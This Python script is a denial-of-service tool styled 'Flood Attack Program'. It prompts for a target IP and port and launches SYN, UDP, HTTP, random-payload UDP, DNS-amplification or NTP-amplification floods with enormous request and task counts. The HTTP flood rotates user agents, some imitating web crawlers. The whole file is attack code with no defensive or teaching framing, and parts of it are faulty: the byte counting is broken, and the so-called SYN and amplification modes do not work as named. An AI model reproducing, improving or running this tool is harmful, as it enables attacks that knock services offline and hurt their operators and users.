import asyncio
import random
import socket
from colorama import Fore
from PIL import Image
import sys
import time

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.56',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 YaBrowser/22.2.1.102 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Whale/2.11.118.33 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102; Pretend to be a web crawler',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36; Mimic Googlebot',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
]

from colorama import Fore

print(Fore.MAGENTA + """
  ____  _   _  __        _____   _____   ____    ___   _   _ 
 / ___|| | | | \ \      / / _ \ | ____| | __ )  / _ \ | | | |
 \___ \| |_| |  \ \ /\ / / | | ||  _|   |  _ \ | | | || | | |
  ___) |  _  |   \ V  V /| |_| || |___  | |_) || |_| || |_| |
 |____/|_| |_|    \_/\_/  \___/ |_____| |____/  \___/  \___/ 
                                                              
""")


async def syn_flood(target_ip, target_port, num_requests, log_file):
    try:
        total_bytes_sent = 0
        for _ in range(num_requests):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            await asyncio.get_event_loop().sock_connect(s, (target_ip, target_port))
            bytes_sent = s.send(b'data')
            total_bytes_sent += bytes_sent
            asyncio.sleep(0.01)
            s.close()
        
        log_file.write(f"SYN Flood Attack - Bytes Sent: {total_bytes_sent}\n")
        print(f"{Fore.MAGENTA}SYN Flood attack completed.")
    except (asyncio.CancelledError, ConnectionError, BufferError, MemoryError):
        print(f"{Fore.YELLOW}Continuing the attack.")
    except Exception as e:
        print(f"{Fore.RED}Error during SYN Flood attack: {e}")

async def udp_flood(target_ip, target_port, num_requests, log_file):
    try:
        total_bytes_sent = 0
        for _ in range(num_requests):
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                bytes_sent = s.sendto(b'data', (target_ip, target_port))
                total_bytes_sent += bytes_sent

        log_file.write(f"UDP Flood Attack - Bytes Sent: {total_bytes_sent}\n")
        print(f"{Fore.MAGENTA}UDP Flood attack completed.")
    except (asyncio.CancelledError, ConnectionError, BufferError, MemoryError):
        print(f"{Fore.YELLOW}Continuing the attack.")
    except Exception as e:
        print(f"{Fore.RED}Error during UDP Flood attack: {e}")

async def http_flood(target_ip, target_port, num_requests, log_file):
    try:
        total_bytes_sent = 0
        for _ in range(num_requests):
            reader, writer = await asyncio.open_connection(target_ip, target_port)
            user_agent = random.choice(USER_AGENTS)
            request = f'GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: {user_agent}\r\nContent-Length: 0\r\n\r\n'
            bytes_sent = writer.write(request.encode())
            total_bytes_sent += bytes_sent
            await writer.drain()
            asyncio.sleep(0.01)
            writer.close()
            await reader.read()

        log_file.write(f"HTTP Flood Attack - Bytes Sent: {total_bytes_sent}\n")
        print(f"{Fore.MAGENTA}HTTP Flood attack completed.")
    except (asyncio.CancelledError, ConnectionError, BufferError, MemoryError):
        print(f"{Fore.YELLOW}Continuing the attack.")
    except Exception as e:
        print(f"{Fore.RED}Error during HTTP Flood attack: {e}")

async def rude_attack(target_ip, target_port, num_packets, log_file):
    try:
        total_bytes_sent = 0
        for _ in range(num_packets):
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                data = bytearray(random.getrandbits(8) for _ in range(1024))
                data_with_header = f"Content-Length: {len(data)}\n".encode() + data
                bytes_sent = s.sendto(data_with_header, (target_ip, target_port))
                total_bytes_sent += bytes_sent

        log_file.write(f"Rude Attack - Bytes Sent: {total_bytes_sent}\n")
        print(f"{Fore.MAGENTA}Rude Attack completed.")
    except (asyncio.CancelledError, ConnectionError, BufferError, MemoryError):
        print(f"{Fore.YELLOW}Continuing the attack.")
    except Exception as e:
        print(f"{Fore.RED}Error during Rude Attack: {e}")

async def dns_amplification(target_ip, target_port, num_requests, log_file):
    try:
        total_bytes_sent = 0
        for _ in range(num_requests):
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                query = b"\x02\x48\x43\x03\x63\x6f\x6d\x00\x00\x0f\x00\x01"
                bytes_sent = s.sendto(query, (target_ip, target_port))
                total_bytes_sent += bytes_sent

        log_file.write(f"DNS Amplification Attack - Bytes Sent: {total_bytes_sent}\n")
        print(f"{Fore.MAGENTA}DNS Amplification attack completed.")
    except (asyncio.CancelledError, ConnectionError, BufferError, MemoryError):
        print(f"{Fore.YELLOW}Continuing the attack.")
    except Exception as e:
        print(f"{Fore.RED}Error during DNS Amplification attack: {e}")

async def ntp_amplification(target_ip, target_port, num_requests, log_file):
    try:
        total_bytes_sent = 0
        for _ in range(num_requests):
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                query = b"\x17\x00\x03\x2a" + b"\x00" * 45
                bytes_sent = s.sendto(query, (target_ip, target_port))
                total_bytes_sent += bytes_sent

        log_file.write(f"NTP Amplification Attack - Bytes Sent: {total_bytes_sent}\n")
        print(f"{Fore.MAGENTA}NTP Amplification attack completed.")
    except (asyncio.CancelledError, ConnectionError, BufferError, MemoryError):
        print(f"{Fore.YELLOW}Continuing the attack.")
    except Exception as e:
        print(f"{Fore.RED}Error during NTP Amplification attack: {e}")

async def start_attack(target_ip, target_port, tasks_count, layer, num_requests, num_bots, num_packets):
    tasks = []
    log_file = open("attack_log.txt", "a")

    if layer == 1:
        attack_func = syn_flood
    elif layer == 2:
        attack_func = udp_flood
    elif layer == 3:
        attack_func = http_flood
    elif layer == 4:
        attack_func = rude_attack
    elif layer == 5:
        attack_func = dns_amplification
    elif layer == 6:
        attack_func = ntp_amplification
    else:
        print("Invalid layer selected")
        return

    try:
        for _ in range(num_bots):
            tasks.append(attack_func(target_ip, target_port, num_requests, log_file))
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}\nProgram stopped by the user.")
    except Exception as e:
        pass
    finally:
        log_file.close()

async def main():
    print(f"{Fore.GREEN}Welcome to Flood Attack Program!")

    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    tasks_count = 10000000000

    print("Choose the attack layer:")
    print("1. Layer 4 (SYN Flood)")
    print("2. Layer 4 (UDP Flood)")
    print("3. Layer 7 (HTTP Flood)")
    print("4. Rude Attack")
    print("5. DNS Amplification")
    print("6. NTP Amplification")
    layer = int(input("Choose the layer (1-6): "))

    num_requests = 10000000000
    num_bots = 10000000000
    num_packets = None
    if layer in [4, 5, 6]:
        num_packets = 10000000000

    timeout = int(input("Enter the timeout duration in seconds: "))
    await asyncio.wait_for(start_attack(target_ip, target_port, tasks_count, layer, num_requests, num_bots, num_packets), timeout=timeout)

    

if __name__ == "__main__":
    asyncio.run(main())
